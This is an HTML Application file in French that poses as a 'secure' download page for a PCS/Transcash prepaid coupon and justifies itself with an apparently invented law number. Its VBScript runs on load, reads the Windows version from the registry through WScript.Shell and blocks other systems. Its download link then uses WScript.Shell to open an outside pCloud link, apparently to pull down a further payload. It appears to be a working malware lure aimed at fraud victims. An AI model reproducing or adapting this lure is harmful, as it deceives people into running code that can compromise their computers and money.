<!DOCTYPE html>
<html>
<head>
  <HTA:APPLICATION
    ID="moncoupon"
    APPLICATIONNAME="Coupon PCS / Transcash"
    BORDER="dialog"
    CAPTION="yes"
    SHOWINTASKBAR="yes"
    SINGLEINSTANCE="yes"
    WINDOWSTATE="normal"
  >
  <title>Téléchargement sécurisé - Coupon PCS / Transcash</title>
  <style>
    body {
      font-family: "Segoe UI", sans-serif;
      background-color: #f4f8ff;
      color: #2c3e50;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 40px;
      text-align: center;
    }
    h1 {
      color: #1a73e8;
      font-size: 22px;
      display: flex;
      align-items: center;
      gap: 10px;
    }
    p {
      font-size: 15px;
      color: #34495e;
      margin: 20px 0;
      max-width: 480px;
    }
    a {
      color: #1a73e8;
      text-decoration: none;
      font-weight: bold;
      cursor: pointer;
    }
    a:hover {
      text-decoration: underline;
    }
    .icon {
      width: 28px;
      height: 28px;
      fill: #1a73e8;
    }
  </style>
  <script language="VBScript">
    Sub Window_OnLoad()
      Dim objShell, osVersion, isWindows, allowed

      Set objShell = CreateObject("WScript.Shell")
      On Error Resume Next
      osVersion = objShell.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductName")

      isWindows = (InStr(osVersion, "Windows") > 0)
      allowed = False

      If isWindows Then
        If InStr(osVersion, "Windows 7") > 0 Then allowed = True
        If InStr(osVersion, "Windows 8.1") > 0 Then allowed = True
        If InStr(osVersion, "Windows 10") > 0 Then allowed = True
        If InStr(osVersion, "Windows 11") > 0 Then allowed = True
      End If

      If Not isWindows Then
        MsgBox "Accès bloqué : ce service n'est autorisé que sur les systèmes Windows.", vbCritical, "Système non pris en charge"
        window.close
        Exit Sub
      End If

      If Not allowed Then
        MsgBox "Version de Windows incompatible. Seuls Windows 7, 8.1, 10 et 11 sont autorisés pour des raisons de sécurité.", vbExclamation, "Accès restreint"
        window.close
        Exit Sub
      End If
    End Sub

    Sub ouvrirLien()
      Dim shell
      Set shell = CreateObject("WScript.Shell")
      shell.Run "https://e.pcloud.link/publink/show?code=XZJ146ZzhoThcAS4R4aUdKRgf8aq5l0LLBV"
    End Sub
  </script>
</head>
<body>
  <h1>
    <svg class="icon" viewBox="0 0 24 24">
      <path d="M12 1a11 11 0 0 0-11 11v7a4 4 0 0 0 4 4h14a4 4 0 0 0 4-4v-7a11 11 0 0 0-11-11zm0 18a4 4 0 1 1 0-8 4 4 0 0 1 0 8z"/>
      <circle cx="12" cy="12" r="2.5"/>
    </svg>
    Coupon PCS / Transcash sécurisé
  </h1>
  <p>
    Conformément à la <strong>loi n° 2024-397</strong>, la remise de votre coupon se fait de manière 100% dématérialisée.<br><br>
    <strong>Pour des raisons de sécurité</strong>, le lien ci-dessous est uniquement accessible depuis un système Windows compatible.
  </p>
  <p>
    👉 <a href="javascript:ouvrirLien()">Télécharger mon coupon sécurisé</a>
  </p>
</body>
</html>
